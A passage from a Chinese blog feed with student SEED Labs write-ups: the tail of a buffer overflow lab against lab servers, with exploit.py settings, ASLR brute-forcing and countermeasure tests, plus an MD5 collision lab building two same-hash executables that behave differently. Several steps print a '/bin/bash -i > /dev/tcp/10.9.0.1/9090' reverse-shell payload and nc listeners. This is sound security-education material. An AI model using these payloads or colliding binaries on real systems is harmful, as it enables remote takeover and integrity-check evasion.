alt=""></p></li><li><p>根据task的要求，要求修改文件中的shellcode变量，执行删除文件的操作；</p><p>先创建一个要被删除的文件<code>target_file.txt</code>（内容随意）；</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095031977.png" alt=""></p><p>以此修改<code>shellcode_32.py</code>中的shellcode变量，因为要保证shellcode的字符数量相同，所以要用空格填充对齐；</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095038316.png" alt=""></p></li><li><p>先<code>make clean</code>清除一下，然后重新执行<code>shellcode_32.py</code>，<code>make</code>之后，重新执行<code>a32.out</code>输出文件，发现<code>target_file.txt</code>文件被删除；</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095044331.png" alt=""></p></li></ol><p><strong>至此，task1完成了！</strong></p><hr><h4 id="Task2-Level-1-Attack">Task2: Level-1 Attack</h4><p><strong>目标服务器及端口：10.9.0.5 9090</strong></p><ol><li><p>先测试一下目标服务器及端口能否连通；</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095050523.png" alt=""></p></li><li><p>输入<code>^C</code>后，返回输入的字符长度为6；</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095058593.png" alt=""></p><p>得到<code>ebp=0xffffd4b8</code> 以及<code>buffer address=0xffffd448</code></p></li><li><p>进入<code>attack-code</code>文件夹，修改<code>exploit.py</code>文件；</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095106143.png" alt=""></p><p>修改shellcode变量为<code>shellcode</code>文件夹中的<code>shellcode_32.py</code>文件；</p><p>修改start变量为<code>517-len(shellcode)</code>；</p><p>修改ret变量为<code>ebp+n</code>，n为任意大于8的整型，即<code>0xffffd4b8+8</code>；</p><p>修改offset变量为<code>0xffffd4b8-0xffffd448+4</code>，即为<code>116</code>；</p></li><li><p>执行<code>exploit.py</code>文件，并执行<code>cat badfile | nc 10.9.0.5 9090</code>语句，server中可以得到返回；</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095116239.png" alt=""></p></li><li><p>根据task中的要求，为了获得权限，将<code>exploit.py</code>文件中的shellcode变量中：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;/bin/ls -l; echo Hello 32; /bin/tail -n 2 /etc/passwd     *&quot;</span><br></code></pre></td></tr></table></figure><p>改为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span><br></code></pre></td></tr></table></figure><p>将发送给10.9.0.5的内容，返回给10.9.0.1，实现反弹shell；</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095127226.png" alt=""></p></li></ol><hr><ul><li><p><font color='orange'>*如何确定反弹shell的ip是否为10.9.0.1？</font></p><p><font color='orange'>在终端输入<code>ifconfig</code>后，可以看到的ip：</font></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095151953.png" alt=""></p></li></ul><hr><ol start="6"><li><p>在另一个终端运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc -lnv 9090<br></code></pre></td></tr></table></figure><p>监听9090端口；</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095206988.png" alt=""></p></li><li><p>运行<code>exploit.py</code>文件，将<code>badfile</code>发送给服务器；</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095216057.png" alt=""></p></li><li><p>服务器中显示连接成功；</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095224063.png" alt=""></p></li><li><p>另一个终端中监听的9090端口，也反弹shell成功！</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095233093.png" alt=""></p></li></ol><p><strong>至此task2完成！</strong></p><hr><h4 id="Task3-Level-2-Attack">Task3: Level-2 Attack</h4><p><strong>目标服务器及端口：10.9.0.6 9090</strong></p><ol><li><p>先测试一下目标服务器及端口能否连通；</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095237893.png" alt=""></p><p>server端成功返回，测试成功：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095243708.png" alt=""></p><p>但是，level-2的docker终端并未返回ebp，只返回了<code>buffer address=0xffffd3f8</code>，但是buffer的大小必然在[100, 300]之间，所以可以用循环，每4字节替换为ret进行测试，则必然可以执行缓冲区溢出攻击成功。</p></li><li><p>修改<code>exploit.py</code>文件，添加循环；</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095249965.png" alt=""></p><p>修改ret变量为<code>buffer address +308</code>，即<code>0xffffd3f8+308</code>；</p><p>添加有关offset的循环；</p><p>注：由于先尝试让服务器简单溢出，所以选择了之前echo 32的代码；</p></li><li><p>执行<code>exploit.py</code>文件，并执行<code>cat badfile | nc 10.9.0.6 9090</code>语句；</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095257529.png" alt=""></p><p>server中可以得到返回，溢出攻击成功！</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095304107.png" alt=""></p></li><li><p>和task2一样，为了获得权限，修改<code>exploit.py</code>文件中的shellcode变量为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span><br></code></pre></td></tr></table></figure><p>将发送给10.9.0.6的内容，返回给10.9.0.1，实现反弹shell；</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095310271.png" alt=""></p></li><li><p>在另一个终端监听9090端口；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc -lnv 9090<br></code></pre></td></tr></table></figure></li><li><p>运行<code>exploit.py</code>文件，将<code>badfile</code>发送给服务器；</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095317871.png" alt=""></p></li><li><p>服务器中显示连接成功；</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095323357.png" alt=""></p></li><li><p>另一个终端中监听的9090端口，也反弹shell成功了！</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095328638.png" alt=""></p></li></ol><p><strong>至此task3完成！</strong></p><hr><h4 id="Task4-Level-3-Attack">Task4: Level-3 Attack</h4><p><strong>目标服务器及端口：10.9.0.7 9090</strong></p><ol><li><p>先测试一下目标服务器及端口能否连通；</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095333993.png" alt=""></p><p>server端成功返回，测试成功：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095339835.png" alt=""></p><p>由此可见，10.9.0.7服务器上运行的是64位的程序，只要能够覆盖64位返回地址，就能实现64位程序的缓冲区溢出攻击。</p><p>得到了<code>rbp=0x00007fffffffe3e0</code>和<code>buffer address=0x00007fffffffe310</code></p></li><li><p>复制<code>shellcode</code>文件夹中的<code>shellcode_64.py</code>文件作为<code>attack-code</code>文件夹中<code>exploit.py</code>文件的shellcode变量；</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095345443.png" alt=""></p><p>修改<code>exploit.py</code>文件的shellcode变量：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095353327.png" alt=""></p><p>修改shellcode变量为<code>shellcode</code>文件夹中<code>shellcode_64.py</code>文件的shellcode变量；</p><p>修改start变量为0；</p><p>修改ret变量为<code>buffer address</code>，即<code>0x00007fffffffe310</code>；</p><p>修改offset变量为<code>rbp-buffer address+8</code>，即<code>0x00007fffffffe3e0-0x00007fffffffe310+8</code>；</p><p>修改content变量，将之前32位的<code>4</code>，修改为<code>8</code>；</p></li><li><p>执行<code>exploit.py</code>文件，并执行<code>cat badfile | nc 10.9.0.7 9090</code>语句；</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095401318.png" alt=""></p><p>server中可以得到返回，可见溢出攻击成功！</p></li><li><p>为了获得权限，修改<code>exploit.py</code>文件中的shellcode变量为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span><br></code></pre></td></tr></table></figure><p>将发送给10.9.0.7的内容，返回给10.9.0.1，实现反弹shell；</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095407722.png" alt=""></p></li><li><p>在另一个终端监听9090端口；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc -lnv 9090<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095414157.png" alt=""></p></li><li><p>运行<code>exploit.py</code>文件，将<code>badfile</code>发送给服务器；</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095419188.png" alt=""></p></li><li><p>服务器中显示连接成功；</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095424207.png" alt=""></p></li><li><p>另一个终端中监听的9090端口，也反弹shell成功了！</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095431373.png" alt=""></p></li></ol><p><strong>至此task4完成！</strong></p><hr><h4 id="Task5-Level-4-Attack">Task5: Level-4 Attack</h4><p><strong>目标服务器及端口：10.9.0.8 9090</strong></p><ol><li><p>先测试一下目标服务器及端口能否连通；</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095437110.png" alt=""></p><p>server端成功返回，测试成功：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095442838.png" alt=""></p><p>得到了<code>rbp=0x00007fffffffe3e0</code>和<code>buffer address=0x00007fffffffe380</code>；</p><p>对比Level-3，Level-4的rbp和buffer address之间的间隔变小了。若将 ret 的值设为RBP+n ， n 是[1184, 1424]之间的值，取n=1200，就能实现缓冲区溢出攻击。</p></li><li><p>修改<code>exploit.py</code>文件如下：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095448284.png" alt=""></p><p>修改start变量为<code>517-len(shellcode)</code>；</p><p>修改ret变量为<code>rbp+n</code>，n取一个足够大的数，比如1200，ret变量变为<code>0x00007fffffffe3e0+1200</code>；</p><p>修改offset变量为<code>rbp-buffer address+8</code>，即<code>0x00007fffffffe3e0-0x00007fffffffe380+8</code>；</p><p>注：由于先尝试让服务器简单溢出，所以选择了之前echo 64的代码；</p></li><li><p>执行<code>exploit.py</code>文件，并执行<code>cat badfile | nc 10.9.0.8 9090</code>语句；</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095455385.png" alt=""></p><p>server中可以得到返回，可见溢出攻击成功！</p></li><li><p>为了获得权限，修改<code>exploit.py</code>文件中的shellcode变量为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span><br></code></pre></td></tr></table></figure><p>将发送给10.9.0.8的内容，返回给10.9.0.1，实现反弹shell；</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095504676.png" alt=""></p></li><li><p>在另一个终端监听9090端口；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc -lnv 9090<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095512150.png" alt=""></p></li><li><p>运行<code>exploit.py</code>文件，将<code>badfile</code>发送给服务器；</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095518726.png" alt=""></p></li><li><p>服务器中显示连接成功；</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095523952.png" alt=""></p></li><li><p>另一个终端中监听的9090端口，也反弹shell成功了！</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095529907.png" alt=""></p></li></ol><p><strong>至此task5完成！</strong></p><hr><h4 id="Task6-Experimenting-with-the-Address-Randomization">Task6: Experimenting with the Address Randomization</h4><ol><li><p>打开ALSR(地址空间随机化)；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo /sbin/sysctl -w kernel.randomize_va_space=2<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095536144.png" alt=""></p></li><li><p>执行两次对服务器10.9.0.5和10.9.0.7的连接；</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095541501.png" alt=""></p><p>可以发现无论是32位，还是64位，每次返回的地址都不相同：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095549669.png" alt=""></p><p>这使得攻击变得很困难。</p></li><li><p>使用Level-1中反弹shell的<code>exploit.py</code> 代码；</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095557614.png" alt=""></p></li><li><p>先在另一终端中监听9090端口；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc -lnv 9090<br></code></pre></td></tr></table></figure><p>然后在<code>attack-code</code>文件夹下执行命令进行爆破：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">./exploit.c<br>./brute-forth.sh<br></code></pre></td></tr></table></figure><p>最终通过23310次，爆破成功：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095607052.png" alt=""></p><p>服务器中显示；</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095614729.png" alt=""></p><p>监听端口反弹shell成功！</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095621174.png" alt=""></p></li></ol><p><strong>至此task6完成！</strong></p><hr><h4 id="Task7-Experimenting-with-Other-Countermeasures">Task7: Experimenting with Other Countermeasures</h4><ol><li><p>进入<code>server-code</code>目录，删除编译过的文件；</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095628236.png" alt=""></p></li><li><p>编辑<code>Makefile</code>文件，删除<code>-fno-stack-protector</code>选项；</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095633673.png" alt=""></p><p>重新编译生成可执行文件：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095640488.png" alt=""></p></li><li><p>用badfile作为stack-L1的输入；</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095647848.png" alt=""></p><p>程序运行失败！说明StackGuard保护机制已开启。</p></li><li><p>进入<code>shellcode</code>文件夹，编辑<code>Makefile</code>文件，删除<code>-z execstack</code>选项；</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095653525.png" alt="">重新make一下：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095659165.png" alt=""></p></li><li><p>两个输出都无法正常输出：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095704277.png" alt=""></p><p>说明栈不可执行！</p></li></ol><hr><h3 id="实验总结">实验总结</h3><p><s>删掉啦</s></p>]]></content>
    
    
    <categories>
      
      <category>study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SEED-Labs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Lab 3</title>
    <link href="/2024/12/26/lab3/"/>
    <url>/2024/12/26/lab3/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1>Lab 3-MD5碰撞实验</h1><h3 id="实验环境">实验环境</h3><ul><li>Ubuntu 20.04</li></ul><h3 id="实验内容">实验内容</h3><p><s>删掉啦</s></p><!-- 本次实验主要是加深大家对MD5碰撞及其原理的理解，使用SEED实验环境中的工具及编程语言，完成以下任务：a) 使用md5collgen生成两个MD5值相同的文件，并利用bless十六进制编辑器查看输出的两个文件，描述你观察到的情况；b) 参考Lab3_task2.c的代码，生成两个MD5值相同但输出不同的两个可执行文件。c) 参考Lab3_task3.c的代码，生成两个MD5值相同但代码行为不相同的可执行文件。d) 回答问题：通过上面的实验，请解释为什么可以做到不同行为的两个可执行文件具有相同的MD5值？ --><hr><h3 id="实验步骤">实验步骤</h3><h4 id="环境部署">环境部署</h4><ol><li><h6 id="gcc-11配置">gcc-11配置</h6><p>添加<code>gcc-11</code> <code>g++-11</code>的源：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226091910948.png" alt=""></p><p>更新一下：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226091916673.png" alt=""></p><p>安装<code>gcc-11</code>和<code>g++-11</code>：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226091921715.png" alt=""></p><p>进入<code>/usr/bin/gcc*</code>文件，发现已经有<code>gcc-11</code>的配置文件了：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226091927747.png" alt=""></p><p>但是此时<code>gcc-11</code>并不是候选项，所以要添加<code>gcc-11</code>的候选项，并设置<code>gcc-11</code>为<code>50</code>优先级：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226091933543.png" alt=""></p><p>查看一下系统中<code>gcc</code>的候选项优先级：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226091940808.png" alt=""></p><p>修改<code>gcc-11</code>的优先级后，系统将默认以<code>gcc-11</code>进行编译：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226091945697.png" alt=""></p></li></ol><hr><ol start="2"><li><h6 id="g-11配置">g++ 11配置</h6><p>一开始的时候系统里<code>g++</code>显示没有候选项，但是输入<code>g++ -V</code>是可以找到文件的：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226091952664.png" alt=""></p><p><code>g++ -v</code>可以找到，但是是9.4版本，需要升级：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226092000392.png" alt=""></p><p>增加<code>g++-11</code>为候选项，并设置<code>g++-11</code>的优先级为<code>50</code>：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226092006186.png" alt=""></p></li></ol><hr><ol start="3"><li><h6 id="在-usr-bin目录下克隆md5collgen：">在<code>/usr/bin</code>目录下克隆<code>md5collgen</code>：</h6><h6 id=""><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226092012196.png" alt=""></h6></li></ol><hr><ol start="4"><li><h6 id="进行makefile">进行makefile</h6><p>进入<code>md5collgen</code>文件夹，发现有<code>makefile</code>文件：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226092016724.png" alt=""></p><p>如果<code>g++-11</code>和<code>gcc-11</code>都已经设置为默认，<code>make</code>就会成功了：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226092022126.png" alt=""></p><p><code>ls</code> 一下，发现有<code>md5collgen</code>文件，即<strong>成功安装</strong>！</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226092028842.png" alt=""></p></li></ol><hr><h4 id="a-task-1：两个不同的文件，但md5码相同：">a) task 1：两个不同的文件，但md5码相同：</h4><ol><li><p>创建一个<code>prefix.txt</code>文件，其中的内容为<code>Message prefix</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo &quot;Message prefix&quot; &gt; prefix.txt<br></code></pre></td></tr></table></figure></li><li><p>使用<code>md5collgen</code>工具，生成<code>prefix.txt</code>的两个子文件<code>prefix_msg1.txt</code> <code>prefix_msg2.txt</code>，并且这两个文件的<strong>md5码</strong>相同：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./md5collgen -p prefix.txt -o prefix_msg1.txt prefix_msg2.txt<br></code></pre></td></tr></table></figure></li><li><p>查看<code>prefix_msg1.txt</code> <code>prefix_msg2.txt</code>两个文件的md5码，发现一致：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">md5sum prefix_msg1.txt<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">md5sum prefix_msg2.txt<br></code></pre></td></tr></table></figure></li><li><p>相关截图</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226092038880.png" alt=""></p></li></ol><hr><h4 id="task-2-文件后添加后缀">task 2: 文件后添加后缀</h4><ol><li><p>将<code>prefix_msg1.txt</code>和<code>prefix.txt</code>连接为<code>out1_long.bin</code>；</p><p><code>prefix_msg2.txt</code>和<code>prefix.txt</code>连接为<code>out2_long.bin</code>；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat prefix_msg1.txt prefix.txt &gt; out1_long.bin<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat prefix_msg2.txt prefix.txt &gt; out2_long.bin<br></code></pre></td></tr></table></figure></li><li><p>连接后两文件的<code>md5</code>值仍然相同：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">md5sum prefix_msg1.txt<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">md5sum prefix_msg2.txt<br></code></pre></td></tr></table></figure></li><li><p>相关截图</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226092043831.png" alt=""></p></li></ol><hr><h4 id="b-task-3-生成两个MD5值相同但输出不同的两个可执行文件">b) task 3: 生成两个MD5值相同但输出不同的两个可执行文件</h4><ol><li><p>编辑文件<code>print_array.c</code>：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226092049784.png" alt=""></p></li><li><p>gcc编译<code>print_array.c</code> 文件，生成<code>a.out</code>：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226092057138.png" alt=""></p></li><li><p>使用<code>bless</code>查看输出数组文件的二进制代码，发现输出时的二进制<code>offset 0x3020</code>不是64的倍数：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226092103348.png" alt=""></p><p>确认prefix取<code>0x3040</code>即为64的倍数，即十进制<code>12352</code>：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226092111033.png" alt=""></p></li><li><p>取suffix为正好在A数组输出完毕的<code>offset 0x30e8</code>，十进制为<code>12520</code>：<img src="https://gitee.com/r0otsu/piclist/raw/master/20241226092119470.png" alt=""></p></li><li><p>保存<code>a.out</code>的前<code>12352</code>个字节为前缀<code>prefix</code>：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226092126536.png" alt=""></p></li><li><p>保存<code>a.out</code>从第<code>12520</code>个字节开始之后的字节为后缀<code>suffix</code>：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226092132589.png" alt=""></p></li><li><p>使用<code>md5collgen</code>工具，将<code>prefix</code> 文件作为前缀，生成两个输出文件 <code>out1.bin</code> 和 <code>out2.bin</code></p><p>输出中显示了文件初始的 MD5 值</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226092139835.png" alt=""></p></li><li><p>将<code>out1.bin</code>的后<code>128</code>个字节存为<code>P</code>；</p><p>并将<code>out2.bin</code>的后<code>128</code>个字节存为<code>Q</code>；</p><p>将前缀文件<code>prefix</code>、中间文件<code>P</code>/<code>Q</code>、后缀文件<code>suffix</code>连接起来，分别存为<code>a1.out</code>/<code>a2.out</code></p><p>并赋予<code>a1.out</code> 和<code> a2.out</code>文件可执行权限</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226092146151.png" alt=""></p></li><li><p>可以看到两个文件的内容是有细微差别的：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226092151719.png" alt=""></p><p>对比发现确实有细微差别：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226092157109.png" alt=""></p></li><li><p>但输出两个文件的md5码，发现虽然文件执行后内容不同，但md5码一致</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226092203107.png" alt=""></p></li></ol><hr><h4 id="c-task-3-生成两个MD5值相同但代码行为不相同的可执行文件">c) task 3: 生成两个MD5值相同但代码行为不相同的可执行文件</h4><ol><li><p>复制Lab3_task3.c进入虚拟机中；</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226092210239.png" alt=""></p></li><li><p>编译Lab3_task3.c为task4，输出为 <code>这是一个良性程序</code> ；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">gcc Lab3_task3.c -o task4<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226092218185.png" alt=""></p></li><li><p>bless查看task4的二进制文件，发现输出x数组时，开始是在<code>0x3020</code>，十进制<code>12320</code>，为了向上取64的倍数，应该取前缀为<code>12352</code>；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">bless task4<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226092226298.png" alt=""></p></li><li><p>把前<code>12352</code>个字节的数组取出来作为prefix前缀文件；</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226092233575.png" alt=""></p></li><li><p>根据前缀文件进行md5碰撞，得到<code>out1.bin</code> 和 <code>out2.bin</code> 两个md5码相同的文件；</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226092239456.png" alt=""></p></li><li><p>复制<code>task4</code>为<code>task4-1</code>和<code>task4-2</code>两个文件；</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226092247265.png" alt=""></p></li><li><p>对<code>task4-1</code>文件进行操作，得到x和y数组相同的文件；</p><p>查看<code>out1.bin</code>文件的后<code>128</code>个字节：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226092254486.png" alt=""></p><p>将<code>task4-1</code>文件中的x和y数组的后<code>128</code>字节都复制为<code>out1.bin</code>文件的后<code>128</code>字节：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226092304420.png" alt=""></p><p>这样就得到了<code>task4-1</code>文件，xy数组相同。</p></li><li><p>对<code>task4-2</code>文件进行操作，得到x和y数组不同的文件；</p><p>查看<code>out1.bin</code>文件的后<code>128</code>个字节：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226092313772.png" alt=""></p><p>查看<code>out2.bin</code>文件的后<code>128</code>个字节：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226092321230.png" alt=""></p><p>将<code>task4-2</code>文件中的 <strong>y数组</strong> 的后<code>128</code>字节都复制为<code>out1.bin</code>文件的后<code>128</code>字节：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226092344069.png" alt="">将<code>task4-2</code>文件中的 <strong>x数组</strong> 的后<code>128</code>字节都复制为<code>out2.bin</code>文件的后<code>128</code>字节：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226092355507.png" alt=""></p><p>这样就得到了<code>task4-2</code>文件，xy数组不相同</p></li><li><p>设置<code>task4-1</code>和<code>task4-2</code>文件的权限；</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226092404194.png" alt=""></p></li><li><p>输出<code>task4-1</code>和<code>task4-2</code>文件的输出不同；</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226092409856.png" alt=""></p><p>计算md5码相同：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226092419049.png" alt=""></p><p>实验成功！</p></li></ol><hr><h4 id="d-回答问题">d) 回答问题</h4><p>通过上面的实验，请解释为什么可以做到不同行为的两个可执行文件具有相同的MD5值？</p><p>答：md5算法是一个典型的<strong>散列函数</strong>，其将任意长度的数据映射为固定长度的128位的散列值；而且md5作为哈希函数，其<strong>只关注输入数据的位模式</strong>，而非数据的语义或功能。</p><p>由于这两个特性，导致md5在计算时，存在<strong>碰撞</strong>的可能性，即通过不同的输入可能可以生成相同的哈希值；并且通过修改部分代码，两个文件可以在执行不同功能的情况下，二进制表示不同，但由于碰撞的前缀prefix相同，则md5码相同。</p><hr><h3 id="实验总结">实验总结</h3><p><s>删掉啦</s></p>]]></content>
    
    
    <categories>
      
      <category>study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SEED-Labs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Lab 2</title>
    <link href="/2024/12/26/lab2/"/>
    <url>/2024/12/26/lab2/</url>
    
